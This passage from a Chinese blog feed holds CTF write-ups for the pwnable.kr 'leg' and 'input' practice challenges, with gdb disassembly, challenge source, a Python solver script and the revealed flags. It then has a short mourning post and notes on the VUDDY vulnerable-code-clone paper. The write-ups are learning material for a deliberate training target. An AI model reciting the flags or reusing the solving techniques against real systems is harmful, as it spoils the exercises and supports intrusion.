&lt;+116&gt;:	mov	r3, #0</span><br><span class="line">   0x00008db4 &lt;+120&gt;:	mov	r0, r3</span><br><span class="line">   0x00008db8 &lt;+124&gt;:	sub	sp, r11, #8</span><br><span class="line">   0x00008dbc &lt;+128&gt;:	pop	&#123;r4, r11, pc&#125;</span><br><span class="line">   0x00008dc0 &lt;+132&gt;:	andeq	r10, r6, r12, lsl #9</span><br><span class="line">   0x00008dc4 &lt;+136&gt;:	andeq	r10, r6, r12, lsr #9</span><br><span class="line">   0x00008dc8 &lt;+140&gt;:			; &lt;UNDEFINED&gt; instruction: 0x0006a4b0</span><br><span class="line">   0x00008dcc &lt;+144&gt;:			; &lt;UNDEFINED&gt; instruction: 0x0006a4bc</span><br><span class="line">   0x00008dd0 &lt;+148&gt;:	andeq	r10, r6, r4, asr #9</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:	mov	r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:	add	r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:	bx	r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:	mov	r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:	adds	r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:	mov	r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>c与asm混合编程，只要我们输入的<code>key</code>的值等于<code>key1()+key2()+key3()</code>的值即可。</p><h3><span id="pkey1">key1()</span><a href="#pkey1" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00008cd4 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">0x00008cdc &lt;+8&gt;:	mov	r3, pc</span><br><span class="line">0x00008ce0 &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">0x00008ce8 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">0x00008cec &lt;+24&gt;:	bx	lr</span><br></pre></td></tr></table></figure><p>返回值为<code>r0</code>,<code>r0</code>保存的是<code>0x00008cdc</code>处时的<code>pc</code>值，由于流水线处理，pc为进接的第二条指令的地址，<code>pc=0x00008ce4</code>，<code>key1()=0x00008ce4</code></p><h3><span id="pkey2">key2()</span><a href="#pkey2" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00008cf0 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">0x00008cf8 &lt;+8&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #-4]!)</span><br><span class="line">0x00008cfc &lt;+12&gt;:	add	r6, pc, #1</span><br><span class="line">0x00008d00 &lt;+16&gt;:	bx	r6</span><br><span class="line">0x00008d04 &lt;+20&gt;:	mov	r3, pc</span><br><span class="line">0x00008d06 &lt;+22&gt;:	adds	r3, #4</span><br><span class="line">0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">0x00008d10 &lt;+32&gt;:	mov	r0, r3</span><br><span class="line">0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0</span><br><span class="line">0x00008d18 &lt;+40&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">0x00008d1c &lt;+44&gt;:	bx	lr</span><br></pre></td></tr></table></figure><p>同<code>key1()</code>,r0保存的是<code>r3+#4</code>，而r3是<code>0X00008d04</code>时的pc值，<code>pc=0x00008d08</code>,所以<code>key2()=0x00008d08+4=0x00008d0c</code></p><h3><span id="pkey3">key3()</span><a href="#pkey3" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00008d20 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">0x00008d24 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">0x00008d28 &lt;+8&gt;:	mov	r3, lr</span><br><span class="line">0x00008d2c &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">0x00008d34 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">0x00008d38 &lt;+24&gt;:	bx	lr</span><br></pre></td></tr></table></figure><p><code>r0</code>的值是<code>lr</code>的值，而<code>lr</code>是子函数返回位置的地址，在main函数中可以看到为<code>0x00008d80</code></p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>所以我们知道<code>key</code>应该等于<code>0x00008d80+0x00008d0c+0x00008ce4=108400</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F; $ .&#x2F;leg</span><br><span class="line">Daddy has very strong arm! : 108400</span><br><span class="line">Congratz!</span><br><span class="line">My daddy has a lot of ARMv5te muscle!</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>My daddy has a lot of ARMv5te muscle!</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— input</title>
    <url>/2e1b27bb.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mom? how can I pass my input to a computer program?</span><br><span class="line"></span><br><span class="line">ssh input2@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上查看<code>ssh input2@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pinput-c">input.c</span><a href="#pinput-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;socket.h&gt;</span><br><span class="line">#include &lt;arpa&#x2F;inet.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	printf(&quot;Welcome to pwnable.kr\n&quot;);</span><br><span class="line">	printf(&quot;Let&#39;s see if you know how to give input to program\n&quot;);</span><br><span class="line">	printf(&quot;Just give me correct inputs then you will get the flag :)\n&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; argv</span><br><span class="line">	if(argc !&#x3D; 100) return 0;</span><br><span class="line">	if(strcmp(argv[&#39;A&#39;],&quot;\x00&quot;)) return 0;</span><br><span class="line">	if(strcmp(argv[&#39;B&#39;],&quot;\x20\x0a\x0d&quot;)) return 0;</span><br><span class="line">	printf(&quot;Stage 1 clear!\n&quot;);	</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; stdio</span><br><span class="line">	char buf[4];</span><br><span class="line">	read(0, buf, 4);</span><br><span class="line">	if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;</span><br><span class="line">	read(2, buf, 4);</span><br><span class="line">        if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;</span><br><span class="line">	printf(&quot;Stage 2 clear!\n&quot;);</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; env</span><br><span class="line">	if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;</span><br><span class="line">	printf(&quot;Stage 3 clear!\n&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; file</span><br><span class="line">	FILE* fp &#x3D; fopen(&quot;\x0a&quot;, &quot;r&quot;);</span><br><span class="line">	if(!fp) return 0;</span><br><span class="line">	if( fread(buf, 4, 1, fp)!&#x3D;1 ) return 0;</span><br><span class="line">	if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	printf(&quot;Stage 4 clear!\n&quot;);	</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; network</span><br><span class="line">	int sd, cd;</span><br><span class="line">	struct sockaddr_in saddr, caddr;</span><br><span class="line">	sd &#x3D; socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">	if(sd &#x3D;&#x3D; -1)&#123;</span><br><span class="line">		printf(&quot;socket error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family &#x3D; AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr &#x3D; INADDR_ANY;</span><br><span class="line">	saddr.sin_port &#x3D; htons( atoi(argv[&#39;C&#39;]) );</span><br><span class="line">	if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;</span><br><span class="line">		printf(&quot;bind error, use another port\n&quot;);</span><br><span class="line">    		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, 1);</span><br><span class="line">	int c &#x3D; sizeof(struct sockaddr_in);</span><br><span class="line">	cd &#x3D; accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);</span><br><span class="line">	if(cd &lt; 0)&#123;</span><br><span class="line">		printf(&quot;accept error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if( recv(cd, buf, 4, 0) !&#x3D; 4 ) return 0;</span><br><span class="line">	if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;</span><br><span class="line">	printf(&quot;Stage 5 clear!\n&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; here&#39;s your flag</span><br><span class="line">	system(&quot;&#x2F;bin&#x2F;cat flag&quot;);	</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><h3><span id="pstep-1">step 1:</span><a href="#pstep-1" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(argc !&#x3D; 100) return 0;</span><br><span class="line">if(strcmp(argv[&#39;A&#39;],&quot;\x00&quot;)) return 0;</span><br><span class="line">if(strcmp(argv[&#39;B&#39;],&quot;\x20\x0a\x0d&quot;)) return 0;</span><br><span class="line">printf(&quot;Stage 1 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>也就是说在执行时传入的参数时，需要有100个参数（包含<code>./input</code>），并且其中的<code>argv['A']</code>要等于<code>\x00</code>,<code>argv['B']</code>要等于<code>\x20\x0a\x0d</code>。</p><h3><span id="pstep-2">step 2:</span><a href="#pstep-2" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   &#x2F;&#x2F; stdio</span><br><span class="line">char buf[4];</span><br><span class="line">read(0, buf, 4);</span><br><span class="line">if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;</span><br><span class="line">read(2, buf, 4);</span><br><span class="line">       if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;</span><br><span class="line">printf(&quot;Stage 2 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>标准输入输出，从标准输入读取4字节<code>\x00\x0a\x00\xff</code>，从标准错误读取四字节<code>\x00\x0a\x02\xff</code></p><h3><span id="pstep-3">step 3:</span><a href="#pstep-3" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; env</span><br><span class="line">if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;</span><br><span class="line">printf(&quot;Stage 3 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>设置环境变量<code>\xde\xad\xbe\xef</code>的值为<code>\xca\xfe\xba\xbe</code></p><h3><span id="pstep-4">step 4:</span><a href="#pstep-4" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   FILE* fp &#x3D; fopen(&quot;\x0a&quot;, &quot;r&quot;);</span><br><span class="line">if(!fp) return 0;</span><br><span class="line">if( fread(buf, 4, 1, fp)!&#x3D;1 ) return 0;</span><br><span class="line">if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;</span><br><span class="line">fclose(fp);</span><br><span class="line">printf(&quot;Stage 4 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>文件操作，从<code>\x0a</code>文件读取四字节，看是否为<code>\x00\x00\x00\x00</code></p><h3><span id="pstep-5">step 5:</span><a href="#pstep-5" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sd, cd;</span><br><span class="line">	struct sockaddr_in saddr, caddr;</span><br><span class="line">	sd &#x3D; socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">	if(sd &#x3D;&#x3D; -1)&#123;</span><br><span class="line">		printf(&quot;socket error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family &#x3D; AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr &#x3D; INADDR_ANY;</span><br><span class="line">	saddr.sin_port &#x3D; htons( atoi(argv[&#39;C&#39;]) );</span><br><span class="line">	if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;</span><br><span class="line">		printf(&quot;bind error, use another port\n&quot;);</span><br><span class="line">    		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, 1);</span><br><span class="line">	int c &#x3D; sizeof(struct sockaddr_in);</span><br><span class="line">	cd &#x3D; accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);</span><br><span class="line">	if(cd &lt; 0)&#123;</span><br><span class="line">		printf(&quot;accept error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if( recv(cd, buf, 4, 0) !&#x3D; 4 ) return 0;</span><br><span class="line">	if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;</span><br><span class="line">	printf(&quot;Stage 5 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>socket 编程，打开端口<code>argv['C']</code>，监听直到接收到数值，判断是否为<code>\xde\xad\xbe\xef</code></p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># input.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">stdinr, stdinw = os.pipe()</span><br><span class="line">stderrr, stderrw = os.pipe()</span><br><span class="line"></span><br><span class="line">args = list(<span class="string">"A"</span>*<span class="number">99</span>)</span><br><span class="line">args[ord(<span class="string">'A'</span>) - <span class="number">1</span>] = <span class="string">""</span></span><br><span class="line">args[ord(<span class="string">'B'</span>) - <span class="number">1</span>] = <span class="string">"\x20\x0a\x0d"</span></span><br><span class="line">args[ord(<span class="string">"C"</span>) - <span class="number">1</span>] = <span class="string">"8888"</span></span><br><span class="line"></span><br><span class="line">os.write(stdinw, <span class="string">"\x00\x0a\x00\xff"</span>)</span><br><span class="line">os.write(stderrw, <span class="string">"\x00\x0a\x02\xff"</span>)</span><br><span class="line"></span><br><span class="line">environ = &#123;<span class="string">"\xde\xad\xbe\xef"</span> : <span class="string">"\xca\xfe\xba\xbe"</span>&#125;</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"\x0a"</span> , <span class="string">"wb"</span>)</span><br><span class="line">f.write(<span class="string">"\x00"</span>*<span class="number">4</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">pro = subprocess.Popen([<span class="string">"/home/input2/input"</span>]+args, stdin=stdinr,stderr=stderrr,env=environ)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">8888</span>))</span><br><span class="line">s.send(<span class="string">"\xde\xad\xbe\xef"</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>但是并没有这么简单，由于文件夹读写权限问题，我们首先需要将脚本scp到<code>/tmp</code>目录下，然后新建一个自己的目录，接着分别建立<code>input.py</code>和<code>flag</code>文件的软链接到自己的目录下，然后执行脚本。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">input2@ubuntu:/tmp$ mkdir ycd</span><br><span class="line">input2@ubuntu:/tmp$ cd ycd</span><br><span class="line">input2@ubuntu:/tmp/ycd$ mv ../input.py .</span><br><span class="line">input2@ubuntu:/tmp/ycd$ ls</span><br><span class="line">input.py</span><br><span class="line">input2@ubuntu:/tmp/ycd$ ln -s /home/input2/flag flag</span><br><span class="line">input2@ubuntu:/tmp/ycd$ python input.py</span><br><span class="line">Welcome to pwnable.kr</span><br><span class="line">Let's see if you know how to give input to program</span><br><span class="line">Just give me correct inputs then you will get the flag :)</span><br><span class="line">Stage 1 clear!</span><br><span class="line">Stage 2 clear!</span><br><span class="line">Stage 3 clear!</span><br><span class="line">Stage 4 clear!</span><br><span class="line">Stage 5 clear!</span><br><span class="line">Mommy! I learned how to pass various input in Linux :)</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>Mommy! I learned how to pass various input in Linux :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.04 哀悼为抗击疫情斗争牺牲的烈士和逝世同胞</title>
    <url>/55e3f1f2.html</url>
    <content><![CDATA[<p>哀悼！</p><a id="more"></a><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdh4vk10v7j30u01hcb2a.jpg" alt="image-20200404022013282"></p>]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>VUDDY A Scalable Approach for Vulnerable Code Clone Discovery(S&amp;P 2017)</title>
    <url>/21fd9cb8.html</url>
    <content><![CDATA[<h2><span id="pabstract">Abstract</span><a href="#pabstract" class="header-anchor">#</a></h2><p>随着开源世界的扩大，代码克隆的情况也越来越普遍，与此同时，由于代码克隆产生的1day漏洞也越来越多，因此自动化的克隆代码漏洞检测成为一大需求。</p><p>本文提出了一种大规模复用漏洞代码检测的方法——VUDDY，能在大规模的代码中精确有效的发现漏洞。</p><p>优势：</p><ul><li>十亿行量级的代码检测只需要14小时17分钟</li><li>可进行传统的完全检测和部分正规化后的检测</li><li>规模和准确率完胜其余的相关研究</li><li>有一定的检测0 day漏洞的能力</li></ul><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>代码克隆缺点：</p><ul><li>raise maintenance costs</li><li>reduce quality</li><li>produce potential legal conflicts</li><li>propagate software vulnerabilities</li><li>…</li></ul><p>最大的问题在于由于代码克隆，一个已经给出的补丁，并不会马上被用于修复使用克隆代码的项目，给黑客的利用提供了可乘之机。</p><p>其余研究的短板：</p><ul><li>CCFinder等：处理太复杂</li><li>ReDeBug：目的是为了大规模、快和准确，但实际效果并不行</li><li>SourcererCC：容易找到已修补的克隆代码</li></ul><p>VUDDY（VUlnerrable coDe clone DiscoverY）…（这名字取的真刻意）：</p><ul><li>函数粒度识别</li><li>正则化使得其漏洞模式（也就是漏洞函数）存在一定通用性</li><li>二级索引：长度+hash，使得其更快</li><li>效果：1764个patch中找到5664个漏洞函数，从25253个C/C++项目中找到了133812个漏洞函数（1 day），比ReDeBug快2倍，having no false positive with Android firmware. Meanwhile, ReDeBug had 17.6 % false positives.</li></ul><p>本文贡献：</p><ul><li>工具VUDDY</li><li>漏洞模式抽象</li><li>自动化漏洞信息获取</li><li>开放服务， <a href="https://iotcube.net/%EF%BC%8C%E6%88%91%E8%AF%95%E7%94%A8%E8%BF%87%EF%BC%8C%E5%81%9A%E7%9A%84%E8%BF%98%E6%98%AF%E5%BE%88%E4%B8%8D%E9%94%99%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E8%A6%81%E8%87%AA%E5%B7%B1%E7%94%A8VUDDY%E5%BC%80%E6%BA%90%E7%9A%84%E4%BB%A3%E7%A0%81%E5%A4%84%E7%90%86%E3%80%82%E7%84%B6%E5%90%8E%E6%8F%90%E4%BA%A4hash%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B%E3%80%82" target="_blank" rel="noopener">https://iotcube.net/，我试用过，做的还是很不错的，但是要自己用VUDDY开源的代码处理。然后提交hash文件检测。</a></li></ul><h2><span id="ptaxonomy-and-related-work">Taxonomy and related work</span><a href="#ptaxonomy-and-related-work" class="header-anchor">#</a></h2><h3><span id="ptaxonomy">Taxonomy</span><a href="#ptaxonomy" class="header-anchor">#</a></h3><p>克隆代码分类：</p><ul><li>Type1：完全克隆，无修改</li><li>Type2：重命名克隆，例如类型名，函数名，变量名等</li><li>Type3：简单的增删等</li><li>Type4：语义克隆</li></ul><p>其中VUDDY支持类型1和类型2的检测</p><p>代码粒度分类：</p><ul><li>token</li><li>line</li><li>function</li><li>file</li></ul><h3><span id="prelated-work">related work</span><a href="#prelated-work" class="header-anchor">#</a></h3><p>根据粒度来讲</p><ul><li>token-level：CCFinder（我用过不好用）、CP-Miner</li><li>line-level：Redebug（好用）</li><li>function-leve：SourcererCC（好用）</li><li>file-level：DECKARD、FCFinder</li><li>Hybrid granularity：VulPecker</li></ul><h3><span id="pproblem-and-goal-statement">Problem and goal statement</span><a href="#pproblem-and-goal-statement" class="header-anchor">#</a></h3><h3><span id="pproblem-formulation">Problem formulation</span><a href="#pproblem-formulation" class="header-anchor">#</a></h3><p>克隆检测定义：从一个代码项目中，判断函数是否存在</p><p>完全克隆定义：$C(f)=1$</p><p>抽象克隆定义：</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdgz3a910nj30ru0kmwhq.jpg" alt="image-20200403230003462"></p><h3><span id="pgoals">Goals</span><a href="#pgoals" class="header-anchor">#</a></h3><p>设计一个能检测1、2类克隆的算法</p><h2><span id="pthe-proprosed-method-vuddy">The proprosed method：VUDDY</span><a href="#pthe-proprosed-method-vuddy" class="header-anchor">#</a></h2><p>VUDDY的框架如下图所示：</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdgz59uvxlj30y60u0gsa.jpg" alt="image-20200403230159765"></p><p>分为两个部分：预处理部分和克隆检测部分</p><p>预处理部分：</p><ul><li>函数提取</li><li>抽象和正规化</li><li>漏洞指纹生成</li></ul><p>克隆检测部分：</p><ul><li>key查询</li><li>hash查询</li></ul><h3><span id="ppreprocess">Preprocess</span><a href="#ppreprocess" class="header-anchor">#</a></h3><p><strong>Function retrieval</strong>：使用ANTLR实现了一个提取C程序中的函数的jar包，并提取参数、类型、局部变量信息</p><p><strong>Abstraction and normalization</strong>：对参数、类型、局部变量进行正规化，（统一用某个字符串代替），可以分为不抽象、参数抽象、局部变量抽象、数据类型抽象、函数调用抽象，见下图</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdgzasl4tcj30ss17gahj.jpg" alt="image-20200403230718496"></p><p><strong>Fingerprint generation</strong>：计算函数体以长度和hash值，示例见下</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdgzblu66ij30sg0mqjvd.jpg" alt="image-20200403230804731"></p><h3><span id="pclone-detector">Clone detector</span><a href="#pclone-detector" class="header-anchor">#</a></h3><p><strong>key lookup</strong>: 长度过滤</p><p><strong>hash lookup</strong>：hash比对</p><p>由于用了两层索引，速度很快，最差是O(n)</p><h2><span id="papplication-vulnerability-detection">Application：Vulnerability detection</span><a href="#papplication-vulnerability-detection" class="header-anchor">#</a></h2><h3><span id="pestablishing-a-vulnerability-database">Establishing a vulnerability database</span><a href="#pestablishing-a-vulnerability-database" class="header-anchor">#</a></h3><ul><li>Git clone</li><li>git log --grep=‘CVE-20’</li><li>Git show commit</li><li>Filter irrelevant commits.</li><li>git show the old file ID</li></ul><p>通过这种方法找到了9779个漏洞不行，对CVE去重后的1764个补丁中找到了5664个扣动函数</p><h3><span id="pvulnerability-detection">Vulnerability detection</span><a href="#pvulnerability-detection" class="header-anchor">#</a></h3><p>和clone detector没啥差别，但是是集合和集合间的交叉搜索</p><h2><span id="pimplememtation">Implememtation</span><a href="#pimplememtation" class="header-anchor">#</a></h2><ul><li>ANTLR实现函数提取部分</li><li>hash选用md5</li><li>字典选用python的<code>dict[Length]=[hash1,hash2..]</code></li></ul><h2><span id="pevalutaion">Evalutaion</span><a href="#pevalutaion" class="header-anchor">#</a></h2><p><strong>实验环境：</strong></p><ul><li>Ubuntu16.04</li><li>2.40 GHz Intel Zeon</li><li>32GB RAM</li><li>6TB HDD</li></ul><p>*<em>数据集：</em> 从2016.1.1到20167.28 github上的 25253个C/C++ git项目</p><p><strong>比较的配置：</strong></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdh00x965jj30me06mab6.jpg" alt="image-20200403233225311"></p><p><strong>大数据量比较：</strong></p><p><img src="../Library/Application%20Support/typora-user-images/image-20200403233154953.png" alt="image-20200403233154953"></p><p><strong>准确率比较：</strong></p><p><img src="../Library/Application%20Support/typora-user-images/image-20200403233301845.png" alt="image-20200403233301845"></p><p>**完全克隆检测和抽象比较 ：**166个 VS 206个，后者比前者多了24%的结果</p><h2><span id="pcompare-with-redebug">Compare with redebug</span><a href="#pcompare-with-redebug" class="header-anchor">#</a></h2><ul><li>twice faster</li><li>less false positive</li><li>VUDDY可以检测第二类但是ReDeBug不行</li></ul><p>具体的分析就不说了</p><h2><span id="pcase-study">Case Study</span><a href="#pcase-study" class="header-anchor">#</a></h2><p>略</p><h2><span id="pdiscussion">Discussion</span><a href="#pdiscussion" class="header-anchor">#</a></h2><p>讨论了函数粒度的优势，包括时间复杂度、内存使用以及精度</p><h2><span id="pge-ren-kan-fa">个人看法</span><a href="#pge-ren-kan-fa" 